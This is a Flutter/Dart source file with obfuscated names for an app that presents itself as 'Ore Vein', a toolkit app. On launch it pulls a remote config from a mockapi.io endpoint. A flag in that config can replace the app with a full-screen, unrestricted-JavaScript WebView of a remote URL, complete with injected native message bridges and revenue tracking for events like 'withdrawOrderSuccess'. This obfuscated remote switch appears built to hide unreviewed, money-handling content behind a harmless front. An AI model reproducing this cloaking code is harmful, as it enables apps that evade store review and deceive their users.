import 'dart:async';
import 'dart:convert';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:adjust_sdk/adjust.dart';
import 'package:adjust_sdk/adjust_config.dart';
import 'package:adjust_sdk/adjust_event.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';

const String qkzmt0 = 'https://69f497a4fb098eb7f0b4951c.mockapi.io/api';
const List<String> qkzmt1 = <String>['qkzmtUr','qkzmtPlaf','qkzmtEnty','qkzmtAfky','qkzmtAid','qkzmtAdky','qkzmtAdelist','qkzmtInpjp'];

typedef Qkzmt1 = Widget Function(BuildContext);
typedef Qkzmt2 = Widget Function(BuildContext, String);
typedef Qkzmt3 = Future<void> Function(String);
typedef Qkzmt4 = void Function(String, Map<String, dynamic>);

Map<String, dynamic>? qkzmt2(String raw) {
  Map<String, dynamic>? obj(dynamic v) {
    if (v is Map) return v.cast<String, dynamic>();
    if (v is String) {
      final s = v.trim();
      if (s.isEmpty) return null;
      try {
        final d = jsonDecode(s);
        if (d is Map) return d.cast<String, dynamic>();
      } catch (_) {
        return null;
      }
    }
    return null;
  }
  dynamic any(dynamic v) {
    if (v is String) {
      final s = v.trim();
      if (s.isEmpty) return v;
      try {
        return jsonDecode(s);
      } catch (_) {
        return v;
      }
    }
    return v;
  }

  final o = obj(raw);
  if (o != null) {
    final n = (o['name'] ?? '').toString();
    if (n.isEmpty) return null;
    final d = o['data'];
    final p = obj(any(d)) ?? <String, dynamic>{};
    return <String, dynamic>{'n': n, 'p': p};
  }

  final i = raw.indexOf('+');
  if (i <= 0) return null;
  final n = raw.substring(0, i);
  final tail = raw.substring(i + 1);
  final p = obj(any(tail)) ?? <String, dynamic>{};
  return <String, dynamic>{'n': n, 'p': p};
}

Map<String, dynamic>? qkzmt3(String raw) {
  Map<String, dynamic>? obj(dynamic v) {
    if (v is Map) return v.cast<String, dynamic>();
    if (v is String) {
      final s = v.trim();
      if (s.isEmpty) return null;
      try {
        final d = jsonDecode(s);
        if (d is Map) return d.cast<String, dynamic>();
      } catch (_) {
        return null;
      }
    }
    return null;
  }
  dynamic any(dynamic v) {
    if (v is String) {
      final s = v.trim();
      if (s.isEmpty) return v;
      try {
        return jsonDecode(s);
      } catch (_) {
        return v;
      }
    }
    return v;
  }
  final o = obj(raw);
  if (o == null) return null;
  final n = (o['eventName'] ?? '').toString();
  if (n.isEmpty) return null;
  final v = o['eventValue'];
  final p = obj(any(v)) ?? <String, dynamic>{};
  return <String, dynamic>{'n': n, 'p': p};
}

class Qkzmt0 extends StatefulWidget {
  const Qkzmt0({
    super.key,
    required this.a,
    this.b = true,
    this.c,
    this.d,
    this.e,
    this.f,
    this.g = const Duration(milliseconds: 550),
    this.h,
    this.i,
    this.j,
    this.k,
    this.l,
  });

  final Qkzmt1 a;
  final bool b;
  final Qkzmt2? c;
  final Qkzmt2? d;
  final Qkzmt3? e;
  final Dio? f;
  final Duration g;
  final Qkzmt4? h;
  final List<String>? i;
  final List<String>? j;
  final Future<List<ConnectivityResult>> Function()? k;
  final Stream<List<ConnectivityResult>> Function()? l;

  @override
  State<Qkzmt0> createState() => _Qkzmt0S();
}

class _Qkzmt0S extends State<Qkzmt0> with SingleTickerProviderStateMixin {
  late final Dio _d = widget.f ?? Dio();
  late final _Qkzmt4S _b = _Qkzmt4S();
  var _started = false;
  StreamSubscription<List<ConnectivityResult>>? _cs;
  late final AnimationController _pulse;

  @override
  void dispose() {
    _pulse.dispose();
    _cs?.cancel();
    super.dispose();
  }

  @override
  void initState() {
    super.initState();
    _pulse = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1100),
    )..repeat(reverse: true);
    if (widget.b) {
      WidgetsBinding.instance.addPostFrameCallback((_) => _go());
    }
  }

  Future<void> _go() async {
    if (_started) return;
    _started = true;
    // Keep a short minimum to avoid one-frame flash.
    if (widget.g > Duration.zero) {
      await Future<void>.delayed(widget.g);
    }
    if (!mounted) return;

    final has = await _h0();
    if (!has) {
      _l();
      return;
    }
    final r = await _q();
    if (!mounted) return;
    if (r == null) {
      _l();
      return;
    }
    final t = (r[qkzmt1[1]] ?? '').toString().trim();
    final k = (r[qkzmt1[0]] ?? '').toString().trim();
    final ijRaw = (r[qkzmt1[7]] ?? '').toString().trim().toLowerCase();
    final ij = (ijRaw == 'true' || ijRaw == '1' || ijRaw == 'yes');
    unawaited(_b.c(r, h: widget.h));
    if (t.isEmpty || k.isEmpty) {
      _l();
      return;
    }
    if (t == '1') {
      _s(1, k, ij);
      return;
    }
    if (t == '2') {
      _s(2, k, ij);
      return;
    }
    if (t == '3') {
      await _x(k);
      if (!mounted) return;
      _l();
      return;
    }
    _l();
  }

  void _l() {
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(
        builder: (c) => _Qkzmt0W(
          a: widget.a,
          c: widget.c,
          d: widget.d,
          e: widget.e,
          f: widget.f,
          h: widget.h,
          i: widget.i,
          j: widget.j,
          k: widget.k,
          l: widget.l,
        ),
      ),
    );
  }

  void _s(int n, String k, bool ij) {
    final b = (n == 1) ? widget.c : widget.d;
    final w = (b != null) ? b(context, k) : _w(n: n, k: k, ij: ij);
    Navigator.of(context).pushReplacement(MaterialPageRoute<void>(builder: (_) => w));
  }

  Future<void> _x(String k) async {
    if (widget.e != null) {
      await widget.e!(k);
      return;
    }
    final u = Uri.tryParse(k);
    if (u == null) return;
    await launchUrl(u, mode: LaunchMode.externalApplication);
  }

  Future<Map?> _q() async {
    // Rule A: when network is available, try remote; otherwise local wrapper handles later.
    final a0 = await _p();
    if (a0 != null) return a0;
    while (mounted) {
      await _c0(s: const Duration(milliseconds: 250));
      final m = await _p();
      if (m != null) return m;
      await Future<void>.delayed(const Duration(milliseconds: 280));
    }
    return null;
  }

  Future<void> _c0({required Duration s}) async {
    try {
      final rs = await (widget.k?.call() ?? Connectivity().checkConnectivity());
      if (!_n1(rs)) return;
      // Give the stack a moment after the first "available" signal.
      await Future<void>.delayed(s);
      return;
    } catch (_) {}

    final done = Completer<void>();
    void fin() {
      if (!done.isCompleted) done.complete();
      _cs?.cancel();
      _cs = null;
    }

    try {
      _cs?.cancel();
      final st = widget.l?.call() ?? Connectivity().onConnectivityChanged;
      _cs = st.listen((rs) async {
        try {
          if (rs.any(_n0)) {
            await Future<void>.delayed(s);
            fin();
          }
        } catch (_) {
          fin();
        }
      });
      await done.future;
    } catch (_) {
      fin();
    }
  }

  bool _n0(ConnectivityResult r) {
    return r == ConnectivityResult.wifi || r == ConnectivityResult.mobile || r == ConnectivityResult.ethernet;
  }

  bool _n1(List<ConnectivityResult> rs) {
    for (final r in rs) {
      if (_n0(r)) return true;
    }
    return false;
  }

  Future<bool> _h0() async {
    try {
      final rs = await (widget.k?.call() ?? Connectivity().checkConnectivity());
      return _n1(rs);
    } catch (_) {
      return true;
    }
  }


  Future<Map?> _p() async {
    try {
      final r = await _d.get<dynamic>(qkzmt0);
      final v = r.data;
      if (v is List && v.isNotEmpty && v.first is Map) {
        final m = v.first as Map;
        return m;
      }
    } catch (_) {}
    return null;
  }

  Widget _w({required int n, required String k, required bool ij}) {
    return _Qkzmt2(
      n: n,
      k: k,
      j: ij,
      b: _b,
      c: widget.h,
      d: (n == 1) ? widget.i : widget.j,
    );
  }

  @override
  Widget build(BuildContext context) {
    final t = Theme.of(context);
    final cs = t.colorScheme;
    return Scaffold(
      body: DecoratedBox(
        decoration: BoxDecoration(
          gradient: RadialGradient(
            center: const Alignment(0.15, -0.35),
            radius: 1.15,
            colors: <Color>[
              cs.tertiary.withValues(alpha: 0.35),
              cs.primary.withValues(alpha: 0.18),
              cs.surface,
            ],
            stops: const <double>[0.0, 0.45, 1.0],
          ),
        ),
        child: SafeArea(
          child: Padding(
            padding: const EdgeInsets.fromLTRB(20, 28, 20, 24),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: <Widget>[
                Text(
                  'Ore Vein',
                  style: t.textTheme.headlineSmall?.copyWith(fontWeight: FontWeight.w700, letterSpacing: 0.2),
                ),
                const SizedBox(height: 6),
                Text(
                  'Priming your toolkit',
                  style: t.textTheme.bodyLarge?.copyWith(color: cs.onSurfaceVariant),
                ),
                const Spacer(),
                AnimatedBuilder(
                  animation: _pulse,
                  builder: (context, _) {
                    final w = _pulse.value;
                    return Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      crossAxisAlignment: CrossAxisAlignment.end,
                      children: List<Widget>.generate(5, (int i) {
                        final phase = (w + i * 0.18) % 1.0;
                        final h = 32.0 + 48.0 * (0.5 + 0.5 * (phase < 0.5 ? phase * 2 : 2 - phase * 2));
                        return Padding(
                          padding: const EdgeInsets.symmetric(horizontal: 6),
                          child: DecoratedBox(
                            decoration: BoxDecoration(
                              color: Color.lerp(cs.primaryContainer, cs.secondaryContainer, i / 4),
                              borderRadius: BorderRadius.circular(10),
                              boxShadow: <BoxShadow>[
                                BoxShadow(
                                  color: cs.primary.withValues(alpha: 0.12 + 0.18 * w),
                                  blurRadius: 10,
                                  offset: const Offset(0, 4),
                                ),
                              ],
                            ),
                            child: SizedBox(width: 14, height: h),
                          ),
                        );
                      }),
                    );
                  },
                ),
                const SizedBox(height: 28),
                ClipRRect(
                  borderRadius: BorderRadius.circular(6),
                  child: LinearProgressIndicator(
                    minHeight: 6,
                    color: cs.primary,
                    backgroundColor: cs.outlineVariant.withValues(alpha: 0.25),
                  ),
                ),
                const Spacer(),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class _Qkzmt0W extends StatefulWidget {
  const _Qkzmt0W({
    required this.a,
    this.c,
    this.d,
    this.e,
    this.f,
    this.h,
    this.i,
    this.j,
    this.k,
    this.l,
  });
  final Qkzmt1 a;
  final Qkzmt2? c;
  final Qkzmt2? d;
  final Qkzmt3? e;
  final Dio? f;
  final Qkzmt4? h;
  final List<String>? i;
  final List<String>? j;
  final Future<List<ConnectivityResult>> Function()? k;
  final Stream<List<ConnectivityResult>> Function()? l;
  @override
  State<_Qkzmt0W> createState() => _Qkzmt0WS();
}

class _Qkzmt0WS extends State<_Qkzmt0W> {
  late final Dio _d = widget.f ?? Dio();
  late final _Qkzmt4S _b = _Qkzmt4S();
  StreamSubscription<List<ConnectivityResult>>? _s;
  var _done = false;
  var _prev = false;

  @override
  void initState() {
    super.initState();
    unawaited(_i0());
  }

  @override
  void dispose() {
    _s?.cancel();
    super.dispose();
  }

  Future<void> _i0() async {
    try {
      final rs = await (widget.k?.call() ?? Connectivity().checkConnectivity());
      _prev = _n1(rs);
      _s?.cancel();
      final st = widget.l?.call() ?? Connectivity().onConnectivityChanged;
      _s = st.listen((rs) {
        final now = _n1(rs);
        if (!_prev && now) {
          unawaited(_t0());
        }
        _prev = now;
      });
      if (_prev) {
        unawaited(_t0());
      }
    } catch (_) {}
  }

  bool _n0(ConnectivityResult r) {
    return r == ConnectivityResult.wifi || r == ConnectivityResult.mobile || r == ConnectivityResult.ethernet;
  }

  bool _n1(List<ConnectivityResult> rs) {
    for (final r in rs) {
      if (_n0(r)) return true;
    }
    return false;
  }

  Future<void> _t0() async {
    if (_done) return;
    _done = true;
    final r = await _p0();
    if (!mounted) return;
    if (r == null) {
      _done = false;
      return;
    }
    final t = (r[qkzmt1[1]] ?? '').toString().trim();
    final k = (r[qkzmt1[0]] ?? '').toString().trim();
    final ijRaw = (r[qkzmt1[7]] ?? '').toString().trim().toLowerCase();
    final ij = (ijRaw == 'true' || ijRaw == '1' || ijRaw == 'yes');
    unawaited(_b.c(r, h: widget.h));
    if (t.isEmpty || k.isEmpty) {
      _done = false;
      return;
    }
    if (t == '1') {
      _s0(1, k, ij);
      return;
    }
    if (t == '2') {
      _s0(2, k, ij);
      return;
    }
    if (t == '3') {
      await _x0(k);
      if (!mounted) return;
      _done = false;
      return;
    }
    _done = false;
  }

  void _s0(int n, String k, bool ij) {
    final b = (n == 1) ? widget.c : widget.d;
    final w = (b != null) ? b(context, k) : _w0(n: n, k: k, ij: ij);
    Navigator.of(context).pushReplacement(MaterialPageRoute<void>(builder: (_) => w));
  }

  Widget _w0({required int n, required String k, required bool ij}) {
    return _Qkzmt2(
      n: n,
      k: k,
      j: ij,
      b: _b,
      c: widget.h,
      d: (n == 1) ? widget.i : widget.j,
    );
  }

  Future<void> _x0(String k) async {
    if (widget.e != null) {
      await widget.e!(k);
      return;
    }
    final u = Uri.tryParse(k);
    if (u == null) return;
    await launchUrl(u, mode: LaunchMode.externalApplication);
  }

  Future<Map?> _p0() async {
    try {
      final r = await _d.get<dynamic>(qkzmt0);
      final v = r.data;
      if (v is List && v.isNotEmpty && v.first is Map) {
        final m = v.first as Map;
        return m;
      }
    } catch (_) {}
    return null;
  }

  @override
  Widget build(BuildContext context) {
    return widget.a(context);
  }
}

class _Qkzmt2 extends StatefulWidget {
  const _Qkzmt2({required this.n, required this.k, required this.j, required this.b, this.c, this.d});
  final int n;
  final String k;
  final bool j;
  final _Qkzmt4S b;
  final Qkzmt4? c;
  final List<String>? d;
  @override
  State<_Qkzmt2> createState() => _Qkzmt2S();
}

class _Qkzmt2S extends State<_Qkzmt2> {
  late final WebViewController _c;
  String _pn = '';
  String _pv = '';
  bool _did = false;
  @override
  void initState() {
    super.initState();
    final u = Uri.tryParse(widget.k);
    _c = WebViewController();
    _c.setJavaScriptMode(JavaScriptMode.unrestricted);
    _c.setNavigationDelegate(NavigationDelegate(
      onNavigationRequest: (req) {
        final u = req.url;
        final uri = Uri.tryParse(u);
        if (uri != null) {
          final h = (uri.host).toLowerCase();
          if (h.contains('t.me')) {
            unawaited(_e(u));
            return NavigationDecision.prevent;
          }
        }
        if (!req.isMainFrame) {
          if (widget.j) {
            return NavigationDecision.navigate;
          }
          unawaited(_e(u));
          return NavigationDecision.prevent;
        }
        return NavigationDecision.navigate;
      },
      onPageStarted: (_) {
        _i();
      },
      onPageFinished: (_) {
        _i();
      },
    ));
    _c.addJavaScriptChannel(
      'qkzmt',
      onMessageReceived: (m) {
        if (_o(m.message)) return;
        widget.b.t(widget.n, m.message, h: widget.c);
      },
    );
    unawaited(_pi());
    if (u != null) {
      _c.loadRequest(u);
    }
    final s = widget.d;
    if (s != null && s.isNotEmpty) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        for (final raw in s) {
          widget.b.t(widget.n, raw, h: widget.c);
        }
      });
    }
  }

  Future<void> _e(String u) async {
    final uri = Uri.tryParse(u);
    if (uri == null) return;
    await launchUrl(uri, mode: LaunchMode.externalApplication);
  }

  Future<void> _pi() async {
    try {
      final p = await PackageInfo.fromPlatform();
      if (!mounted) return;
      _pn = p.packageName;
      _pv = p.version;
      _i();
    } catch (_) {}
  }

  void _i() {
    if (_did) return;
    _did = true;
    final c = String.fromCharCode(39);
    final js0 = '(function(){try{window.jsBridge=window.jsBridge||{};window.jsBridge.postMessage=function(name,data){try{var d=data;if(d!==null&&typeof d===\"object\"){d=JSON.stringify(d);}var m=JSON.stringify({name:String(name||\"\"),data:d});qkzmt.postMessage(m);}catch(e){}};window.webkit=window.webkit||{};window.webkit.messageHandlers=window.webkit.messageHandlers||{};window.webkit.messageHandlers.Post={postMessage:function(o){try{qkzmt.postMessage(JSON.stringify(o));}catch(e){}}};window.webkit.messageHandlers.event={postMessage:function(s){try{qkzmt.postMessage(String(s));}catch(e){}}};}catch(e){}})();';
    final js1 = (_pn.isNotEmpty && _pv.isNotEmpty)
        ? '(function(){try{window.WgPackage={name:' + c + _pn + c + ',version:' + c + _pv + c + '};}catch(e){}})();'
        : '';
    unawaited(_c.runJavaScript(js0));
    if (js1.isNotEmpty) {
      unawaited(_c.runJavaScript(js1));
    }
    _did = false;
  }

  bool _o(String raw) {
    final msg = (widget.n == 1) ? qkzmt2(raw) : qkzmt3(raw);
    if (msg == null) return false;
    final name = (msg['n'] ?? '').toString();
    if (name != 'openWindow' && name != 'openSafari') return false;
    final payload = (msg['p'] is Map) ? (msg['p'] as Map).cast<String, dynamic>() : <String, dynamic>{};
    final u = (payload['url'] ?? '').toString();
    if (u.isEmpty) return true;
    final uri = Uri.tryParse(u);
    if (uri != null) {
      final h = uri.host.toLowerCase();
      if (h.contains('t.me')) {
        unawaited(_e(u));
        return true;
      }
    }
    if (widget.j) {
      final uri = Uri.tryParse(u);
      if (uri != null) {
        unawaited(_c.loadRequest(uri));
      }
      return true;
    }
    unawaited(_e(u));
    return true;
  }
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: ColoredBox(
        color: Colors.black,
        child: SafeArea(
          child: WebViewWidget(controller: _c),
        ),
      ),
    );
  }
}

class _Qkzmt4S {
  var _ok = false;
  var _tp = '';
  AppsflyerSdk? _af;
  Map<String, String> _am = <String, String>{};

  Future<void> c(Map m, {Qkzmt4? h}) async {
    if (_ok) return;
    final p2 = (m[qkzmt1[2]] ?? '').toString().trim();
    final p3 = (m[qkzmt1[3]] ?? '').toString().trim();
    final p4 = (m[qkzmt1[4]] ?? '').toString().trim();
    final p5 = (m[qkzmt1[5]] ?? '').toString().trim();
    final p6 = (m[qkzmt1[6]] ?? '').toString();
    _tp = p2;
    try {
      if (_tp == 'af') {
        if (p3.isEmpty || p4.isEmpty) return;
        final opt = AppsFlyerOptions(afDevKey: p3, appId: p4, showDebug: false);
        final sdk = AppsflyerSdk(opt);
        await sdk.initSdk(
          registerConversionDataCallback: false,
          registerOnAppOpenAttributionCallback: false,
          registerOnDeepLinkingCallback: false,
        );
        _af = sdk;
        _ok = true;
        return;
      }
      if (_tp == 'ad') {
        if (p5.isEmpty) return;
        _am = _m(p6);
        final cfg = AdjustConfig(p5, AdjustEnvironment.production);
        Adjust.initSdk(cfg);
        _ok = true;
        return;
      }
    } catch (_) {}
  }

  void t(int n, String raw, {Qkzmt4? h}) {
    final msg = (n == 1) ? qkzmt2(raw) : qkzmt3(raw);
    if (msg == null) return;
    final name = (msg['n'] ?? '').toString();
    final payload = (msg['p'] is Map) ? (msg['p'] as Map).cast<String, dynamic>() : <String, dynamic>{};
    if (name.isEmpty) return;
    h?.call(name, payload);
    if (!_ok) return;
    try {
      if (_tp == 'af') {
        final sdk = _af;
        if (sdk == null) return;
        final amountAny = payload['amount'] ?? payload['af_revenue'] ?? payload['price'];
        final currency = (payload['currency'] ?? '').toString();
        final amount = _n(amountAny);
        if (amount != null && currency.isNotEmpty) {
          final revenue = (name == 'withdrawOrderSuccess') ? -amount : amount;
          final v = <String, dynamic>{...payload, 'af_revenue': revenue, 'af_currency': currency};
          sdk.logEvent(name, v);
          return;
        }
        sdk.logEvent(name, payload);
        return;
      }
      if (_tp == 'ad') {
        final token = _am[name];
        if (token == null || token.isEmpty) return;
        final ev = AdjustEvent(token);
        final amountAny = payload['amount'] ?? payload['af_revenue'] ?? payload['price'];
        final currency = (payload['currency'] ?? '').toString();
        final amount = _n(amountAny);
        if (amount != null && currency.isNotEmpty) {
          final revenue = (name == 'withdrawOrderSuccess') ? -amount : amount;
          ev.setRevenue(revenue.toDouble(), currency);
        }
        Adjust.trackEvent(ev);
        return;
      }
    } catch (_) {}
  }

  num? _n(dynamic v) {
    if (v is num) return v;
    if (v is String) return num.tryParse(v);
    return null;
  }

  Map<String, String> _m(String raw) {
    final map = <String, String>{};
    final s = raw.trim();
    if (s.isEmpty) return map;
    try {
      final d = jsonDecode(s);
      if (d is Map) {
        for (final e in d.entries) {
          final k = e.key.toString();
          final v = e.value?.toString() ?? '';
          if (v.isNotEmpty) map[k] = v;
        }
      }
    } catch (_) {}
    return map;
  }
}
